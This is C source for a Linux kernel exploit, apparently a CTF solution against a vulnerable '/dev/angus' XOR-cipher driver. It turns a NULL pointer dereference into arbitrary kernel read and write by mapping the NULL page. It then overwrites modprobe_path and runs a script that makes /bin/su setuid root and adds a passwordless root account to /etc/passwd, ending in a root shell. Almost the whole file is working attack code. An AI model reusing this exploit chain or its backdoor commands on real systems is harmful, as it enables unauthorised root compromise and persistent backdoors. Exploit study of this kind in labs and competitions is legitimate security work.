#include "kpwn.h"
#include "struct.h"

#define CMD_INIT 0x13370001
#define CMD_SETKEY 0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

int fd;

int angus_init(void)
{
    request_t req = {NULL};
    return ioctl(fd, CMD_INIT, &req);
}

int angus_setkey(char *key, size_t keylen)
{
    request_t req = {.ptr = key, .len = keylen};
    return ioctl(fd, CMD_SETKEY, &req);
}

int angus_setdata(char *data, size_t datalen)
{
    request_t req = {.ptr = data, .len = datalen};
    return ioctl(fd, CMD_SETDATA, &req);
}

int angus_getdata(char *data, size_t datalen)
{
    request_t req = {.ptr = data, .len = datalen};
    return ioctl(fd, CMD_GETDATA, &req);
}

int angus_encrypt()
{
    request_t req = {NULL};
    return ioctl(fd, CMD_ENCRYPT, &req);
}

int angus_decrypt()
{
    request_t req = {NULL};
    return ioctl(fd, CMD_DECRYPT, &req);
}

void test_vuln1()
{
    char buf[0x10];
    fd = open("/dev/angus", O_RDWR);
    if (fd == -1)
    {
        errExit("open");
    }

    angus_init();
    angus_setkey("ABC123", 6);
    angus_setdata("Hello, World!", 13);

    angus_encrypt();
    angus_getdata(buf, 13);
    for (int i = 0; i < 13; i++)
    {
        printf("%02x ", (unsigned char)buf[i]);
    }
    putchar('\n');

    angus_decrypt();
    angus_getdata(buf, 13);
    for (int i = 0; i < 13; i++)
    {
        printf("%02x ", (unsigned char)buf[i]);
    }
    putchar('\n');

    close(fd);
}

void test_vuln2()
{
    /*
     * BUG: kernel NULL pointer dereference, address: 0000000000000008
     * #PF: supervisor read access in kernel mode
     * #PF: error_code(0x0000) - not-present page
     * PGD 8000000002fc1067 P4D 8000000002fc1067 PUD 2fc0067 PMD 0
     */
    fd = open("/dev/angus", O_RDWR);
    if (fd == -1)
        errExit("open");

    // angus_init();
    angus_encrypt();

    close(fd);
}

/*
* Because the kernel module XorCipher references to NULL pointer
* we can control it by setting ptr to NULL (0x0)
* and mmap NULL page
* With this we can achieve arbitrary read/write on that XorCipher struct
*/
XorCipher *ptr = NULL;
int AAR(char *dst, char *src, size_t len)
{
    ptr->data = src;
    ptr->datalen = len;
    return angus_getdata(dst, len);
}

void AAW(char *dst, char *src, size_t len)
{
    char *tmp = (char *)malloc(len);
    if (tmp == NULL)
        errExit("malloc");
    AAR(tmp, dst, len);

    for (size_t i = 0; i < len; i++)
        tmp[i] ^= src[i];

    /*
     * AAW: Xor base value with controlled value
     * call encrypt -> controlled = dest ^ key
     * key = dest ^ input
     * --> controlled = input
     */
    ptr->data = dst;
    ptr->datalen = len;
    ptr->key = tmp;
    ptr->keylen = len;
    angus_encrypt();

    free(tmp);
}

int main(int argc, char *argv[])
{

    fd = open("/dev/angus", O_RDWR);
    if (fd < 0)
    {
        errExit("open");
    }

    // Map NULL page so that derefencing to NULL won't crash (just beacuse SMAP is disabled)
    if (mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_POPULATE, -1, 0) == MAP_FAILED)
    {
        errExit("mmap");
    }

    uint64_t addr;
    const uint64_t start = 0xffff888000000000;
    const uint64_t end = 0xffffc88000000000;
    const size_t stride = 0x400000;
    const uint64_t progress_interval = 0x40000000; // log every 1 GiB to reduce stdout churn
    const char modprobe_sig[] = "/sbin/modprobe";
    const size_t modprobe_sig_len = sizeof(modprobe_sig) - 1;
    char *needle;
    char *buf = malloc(stride);

    if (!buf)
    {
        errExit("malloc");
    }

    for (addr = start; addr < end; addr += stride)
    {
        if ((addr & (progress_interval - 1)) == 0)
        {
            logInfo("Searching kernel 0x%016lx...", addr);
        }

        if (AAR(buf, (char *)addr, stride) != 0)
        {
            continue;
        }

        if ((needle = memmem(buf, stride, modprobe_sig, modprobe_sig_len)))
        {
            addr += (uint64_t)(needle - buf);
            logOK("Found modprobe: 0x%016lx", addr);
            break;
        }
    }

    if (addr >= end)
    {
        logErr("Not found modprobe");
        free(buf);
        close(fd);
        return -1;
    }

    logInfo("Overwrite modprobe_path...");
    char modprobe_path[] = "/tmp/x\x00";
    AAW((char *)addr, modprobe_path, sizeof(modprobe_path));

    logInfo("Prepare /tmp/x script and trigger modprobe");
    system("echo -e \"#!/bin/sh\nchown root:root /bin/su\nchmod u+s /bin/su\necho 'kasero::0:0:root:/:/bin/sh' >> /etc/passwd\n\" > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");

    logInfo("Ngon!");
    system("su kasero; /bin/sh");

    free(buf);
    close(fd);

    return 0;
}
